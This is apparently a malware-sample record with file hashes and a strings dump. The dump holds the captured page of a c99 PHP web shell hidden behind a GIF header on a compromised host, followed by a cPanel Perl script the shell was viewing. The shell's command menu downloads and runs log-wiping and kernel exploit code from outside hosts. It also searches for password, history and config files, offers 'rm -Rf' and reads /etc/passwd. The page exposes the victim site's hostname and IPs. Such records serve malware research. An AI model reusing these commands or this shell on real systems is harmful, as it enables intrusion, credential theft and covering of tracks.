value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/scripts/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0121 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_e9725eefbc604dd68f1ac4420a554fa4",
    "filesize": 33064,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "e9725eefbc604dd68f1ac4420a554fa4",
        "sha1": "618e2629d22db2346a9bb8b1623bb4fb863f033a",
        "sha256": "affdb9a48c5c58f3ed20fe1816de60a14bace166413ff1aee2ea6f2044e50d37"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.178.86>87.177.178.86</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[ftpup]&nbsp;ftpup (13.24 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=ftpup&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=ftpup&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=ftpup&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=txt&d=%2Fscripts%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=ftpup&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=ftpup&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=ftpup&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=ftpup&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=ftpup&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=ftpup&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=ftpup&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=ftpup&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=ftpup&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=edit&d=%2Fscripts%2F\"><b><u>[change]</u></b></a> (<a href=\"?act=f&f=ftpup&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><form action=\"?act=f&f=ftpup&ft=edit&d=%2Fscripts%2F\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='?act=ls&d=/scripts';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"10\">#!/usr/bin/perl",
            "# cpanel - ftpup                                  Copyright(c) 2010 cPanel, Inc.",
            "#                                                           All rights Reserved.",
            "# copyright@cpanel.net                                         http://cpanel.net",
            "# This code is subject to the cPanel license. Unauthorized copying is prohibited",
            "BEGIN { unshift @INC, '/usr/local/cpanel', '/scripts'; }",
            "use IPC::Open3                 ();",
            "use Cpanel::OSSys              ();",
            "use Cpanel::Sys                ();",
            "use Cpanel::SysPkgs            ();",
            "use Cpanel::Logger             ();",
            "use Cpanel::Config::LoadCpConf ();",
            "use Cpanel::FtpUtils::Config   ();",
            "use Cpanel::RpmStor            ();",
            "use Cpanel::HttpRequest        ();",
            "use Cpanel::RpmUtils           ();",
            "use Cpanel::Update             ();",
            "use Cpanel::Proc               ();",
            "use Cpanel::Sys::OS            ();",
            "use Cpanel::Init               ();",
            "use Cpanel::SSLCerts           ();",
            "use cPpkgversions              ();",
            "use Fcntl                      ();",
            "use RestartSrv;",
            "Cpanel::Update::safe_update_environment('ftp');",
            "Cpanel::Update::init_UP_update('ftp');",
            "my $logger = Cpanel::Logger-&gt;new();",
            "my ( $system, $release, $machine ) = ( Cpanel::OSSys::uname() )[ 0, 2, 4 ];",
            "my $httpClient = Cpanel::HttpRequest-&gt;new( 'hideOutput' =&gt; 0 );",
            "my $hostname   = Cpanel::Sys::gethostname();",
            "my $cpconf_ref = Cpanel::Config::LoadCpConf::loadcpconf();",
            "my $pkg        = $cpconf_ref-&gt;{'ftpserver'} || 'pure-ftpd';",
            "my $kill       = $pkg eq 'pure-ftpd' ? 'proftpd' : 'pure-ftpd';",
            "my $now        = time;",
            "my $latest     = 0;",
            "my $src        = 0;",
            "my $force      = 0;",
            "if (@ARGV) {",
            "    if ( grep( /force/,  @ARGV ) ) { $force  = 1; }",
            "    if ( grep( /source/, @ARGV ) ) { $src    = 1; }",
            "    if ( grep( /latest/, @ARGV ) ) { $latest = 1; }",
            "    if ( grep( /\\Q$kill\\E/, @ARGV ) ) {",
            "        print &quot;/scripts/ftpup does not support arguments to change the configured FTP server.\\n&quot;;",
            "        print &quot;Use \\&quot;/scripts/setupftpserver $kill\\&quot; instead.\\n&quot;;",
            "        exit 1;",
            "    }",
            "unless ( $pkg eq 'pure-ftpd' || $pkg eq 'proftpd' ) {",
            "    die &quot;Unknown FTP server: $pkg&quot;;",
            "print &quot;Ftp Setup Script Version 6.1\\n&quot;;",
            "$ENV{'PATH'} = $ENV{'PATH'} . ':/usr/sbin';",
            "my $syspkgobj = Cpanel::SysPkgs-&gt;new();",
            "if ( !$syspkgobj ) {",
            "    die print &quot;Could not create SysPkgs object\\n&quot;;",
            "my @pkgs = ($pkg);",
            "if ( $system =~ /freebsd/i ) {",
            "    system(&quot;/scripts/checkmakeconf&quot;);",
            "    system(&quot;/scripts/portsup&quot;);",
            "    my $result;",
            "    print &quot;This is the $pkg installer\\n&quot;;",
            "    my (@CMD);",
            "    if ($force) {",
            "        @CMD = ( '/scripts/installpkg', '--force', $pkg );",
            "    }",
            "    else {",
            "        @CMD = ( '/scripts/installpkg', '--keepnew', $pkg );",
            "    }",
            "    open( RNULL, '&lt;', '/dev/null' );",
            "    IPC::Open3::open3( '&lt;&amp;RNULL', \\*OP, '&gt;&amp;STDERR', @CMD );",
            "    while (&lt;OP&gt;) {",
            "        $result .= $_;",
            "    }",
            "    close(RNULL);",
            "    if ( $pkg eq 'proftpd' ) {",
            "        if ( -e &quot;/etc/proftpd&quot; ) {",
            "            chmod( 0751, &quot;/etc/proftpd&quot; );",
            "        }",
            "        else {",
            "            mkdir( '/etc/proftpd', 0751 );",
            "        }",
            "    }",
            "    else {",
            "        # Replacement for installcpbsdpkg pure-ftpd",
            "        # Install pureauth",
            "        my $pureauth     = '/usr/local/sbin/pureauth';",
            "        my $pureauth_src = '/usr/local/cpanel/bin/pureauth';",
            "        unless ( -e $pureauth &amp;&amp; ( stat($pureauth) )[7] == ( stat($pureauth_src) )[7] &amp;&amp; ( stat($pureauth) )[9] &gt;= ( stat($pureauth_src) )[9] ) {",
            "            print &quot;Updating pureauth.\\n&quot;;",
            "            system( 'cp', '-fv', $pureauth_src, $pureauth );",
            "            chmod( 0700, $pureauth );",
            "        }",
            "        # Install pureauth init script",
            "        print &quot;Updating purauth init script.\\n&quot;;",
            "        my $init = Cpanel::Init-&gt;new() || $logger-&gt;die('Could not create Init object');",
            "        $init-&gt;run_command_for_one( 'install', 'pure-authd' );",
            "    }",
            "    # Check SSL cert",
            "    print &quot;Checking SSL certs...&quot;;",
            "    my $valid_certs = 1;",
            "  CERT_CHECK:",
            "    foreach my $dir ( '/etc/', '/etc/ssl/private/' ) {",
            "        foreach my $file ( 'pure-ftpd.pem', 'ftpd-rsa-key.pem', 'ftpd-rsa.pem' ) {",
            "            unless ( -e $dir . $file ) {",
            "                $valid_certs = 0;",
            "                last CERT_CHECK;",
            "            }",
            "        }",
            "    }",
            "    if ($valid_certs) {",
            "        print &quot;done\\n&quot;;",
            "    }",
            "    else {",
            "        print &quot;missing\\n&quot;;",
            "        print &quot;Generating default certs...&quot;;",
            "        open OLDSTDERR, '&gt;&amp;STDERR';",
            "        open STDERR, '&gt;', '/dev/null';",
            "        Cpanel::SSLCerts::createDefaultSSLFiles( 'service' =&gt; 'ftp' );",
            "        open STDERR, '&gt;&amp;OLDSTDERR';",
            "        print &quot;done\\n&quot;;",
            "    }",
            "    if ( !$force &amp;&amp; $result !~ /reinstall/im &amp;&amp; ( $result =~ /(^|(?&lt;!Checking if)\\s)\\s*\\S*${pkg}.*\\salready\\s+installed/m || $result =~ /${pkg}.*\\sis\\s+installed/m || $result =~ /${pkg}.*\\sis\\s+newer/m ) ) {",
            "        print $result;",
            "        check_proftpd_conf();",
            "        exit();",
            "    }",
            "    Cpanel::Proc::doom($kill);",
            "    print &quot;Removing old ftp server ($kill)\\n&quot;;",
            "    system( &quot;pkg_delete&quot;, &quot;-x&quot;, $kill );",
            "    resetbsdpkgcache();",
            "    setupftpconf();",
            "    resftp();",
            "    exit;",
            "my $arch = 'i386';",
            "if ( -e &quot;/etc/trustix-release&quot; ) {",
            "    $distro = 'trustix';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/trustix-release');",
            "    $arch = 'i586';",
            "elsif ( -e &quot;/etc/caos-release&quot; ) {",
            "    $distro = 'caos';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/caos-release');",
            "elsif ( -e &quot;/etc/SuSE-release&quot; ) {",
            "    $distro = 'suse';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/SuSE-release');",
            "    if ( $version &gt;= 9 ) { $arch = 'i586'; }",
            "elsif ( -e &quot;/etc/fedora-release&quot; ) {",
            "    $distro = 'fedora';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/fedora-release');",
            "elsif ( -e &quot;/etc/mandrake-release&quot; ) {",
            "    $distro = 'mandrake';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/mandrake-release');",
            "    $arch = 'i586';",
            "elsif ( -e &quot;/etc/whitebox-release&quot; ) {",
            "    $distro = 'whitebox';",
            "    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/whitebox-release');",
            "elsif ( -e &quot;/etc/redhat-release&quot; ) {",
            "    $distro = 'redhat';",
            "    ( $version, $ises ) = Cpanel::Sys::OS::getversionfromfile('/etc/redhat-release');",
            "if ( $ises == 1 ) {",
            "    $version = &quot;AS-${version}&quot;;",
            "if ( $ises == 2 ) {",
            "    $distro = &quot;centos&quot;;",
            "if ( $ises == 3 ) {",
            "    $distro = &quot;whitebox&quot;;",
            "my $xdir = '';",
            "if ( $machine =~ /64/ ) {",
            "    $arch = 'x86_64';",
            "    $xdir .= &quot;/64&quot;;",
            "my $basedir = $pkg;",
            "my ( $buildnum, $eximver, $bsv );",
            "my %VINFO = cPpkgversions::getpkgversioninfo('ftp');",
            "if ( $pkg eq &quot;proftpd&quot; ) {",
            "    $buildnum = $VINFO{'proftpd'}{'release'};",
            "    $ftpver   = $VINFO{'proftpd'}{'version'};",
            "    $bsv      = $VINFO{'proftpd'}{'flags'};",
            "elsif ( $pkg eq &quot;pure-ftpd&quot; ) {",
            "    $buildnum = $VINFO{'pure-ftpd'}{'release'};",
            "    $ftpver   = $VINFO{'pure-ftpd'}{'version'};",
            "    $bsv      = $VINFO{'pure-ftpd'}{'flags'};",
            "if ( $bsv ne &quot;&quot; ) { $bsv = &quot;_&quot; . $bsv; }",
            "my $cver = `rpm -q $pkg 2&gt;/dev/null`;",
            "chomp($cver);",
            "if ( -e &quot;/etc/proftpd&quot; ) { chmod( 0751, &quot;/etc/proftpd&quot; ); }",
            "else                     { mkdir( '/etc/proftpd', 0751 ); }",
            "print &quot;This is the $pkg $ftpver installer release number ${buildnum} for platform ${distro} ${version}\\n&quot;;",
            "if ( $cver eq &quot;${pkg}-${ftpver}-${buildnum}${bsv}&quot; &amp;&amp; !$force ) {",
            "    print &quot;${pkg} is up to date.  Use ftpup --force to force a reinstall\\n&quot;;",
            "    check_proftpd_conf();",
            "    exit();",
            "if ( -x '/scripts/preftpup' ) {",
            "    system '/scripts/preftpup';",
            "if ( -e '/home/ftpup-install' ) {",
            "    system 'rm', '-rf', '/home/ftpup-install';",
            "mkdir '/home/ftpup-install', 0700;",
            "chdir '/home/ftpup-install';",
            "@pkgs = qw( libdb3.3-devel db4-devel pam-devel openssl openssl-devel gcc glibc-devel compat-db zlib-devel rpm-build tcp_wrap tcpd tcp_wrap-devel tcpd-devel );",
            "$syspkgobj-&gt;install( 'pkglist' =&gt; \\@pkgs );",
            "system(&quot;/scripts/checklibssl&quot;);",
            "print &quot;Resetting $pkg to cPanel Defaults and Installing the Latest Version\\n&quot;;",
            "my $url  = &quot;http://diff.cpanel.net/ftpinstall/${basedir}/${xdir}/${distro}/${version}/${pkg}-${ftpver}-${buildnum}${bsv}.${arch}.rpm&quot;;",
            "my @SLA  = split( /\\//, $url );",
            "my $file = $SLA[$#SLA];",
            "die &quot;File $file is not valid&quot; if ( $file eq &quot;&quot; );",
            "if ( !$src ) {",
            "    $httpClient-&gt;download( $url, $file );",
            "    if ( ( stat(&quot;$file&quot;) )[7] &lt;= 0 ) {",
            "        print &quot;Failed to download $url .. using source instead\\n&quot;;",
            "        $latest = 1;",
            "        $src    = 1;",
            "    }",
            "if ($src) {",
            "    $file = buildrpm();",
            "    if ( !$file ) {",
            "        die &quot;Rpm failed to build!&quot;;",
            "    }",
            "if ( ( stat(&quot;$file&quot;) )[7] &lt;= 0 ) {",
            "    die &quot;Failed to download/build $url&quot;;",
            "if ( !Cpanel::RpmUtils::checkrpm($file) ) {",
            "    die &quot;${file} is not a valid rpm file&quot;;",
            "if ( $pkg eq &quot;proftpd&quot; ) {",
            "    Cpanel::Proc::doom(&quot;pure-ftpd&quot;);",
            "    nooutputsystem( &quot;rpm&quot;, &quot;-e&quot;, &quot;pure-ftpd&quot; );",
            "else {",
            "    Cpanel::Proc::doom(&quot;proftpd&quot;);",
            "    nooutputsystem( &quot;rpm&quot;, &quot;-e&quot;, &quot;proftpd&quot; );",
            "$ENV{'RPMINSTALL'} = 1;",
            "Cpanel::RpmUtils::rpmpreinstall($file);",
            "my @ftp_cert_files = qw( /etc/ftpd-rsa.pem /etc/ftpd-rsa-key.pem /etc/ftpd-dhparam.pem /etc/ftpd-dsa-key.pem /etc/ftpd-dsa.pem /etc/ssl/private/pure-ftpd.pem );",
            "foreach my $cert_file (@ftp_cert_files) {",
            "    # Remove any lingering &quot;preinstall&quot; certs",
            "    if ( -e $cert_file . '.preinstall' ) {",
            "        unlink $cert_file . '.preinstall';",
            "    }",
            "    # Rename existing certs",
            "    if ( -e $cert_file ) {",
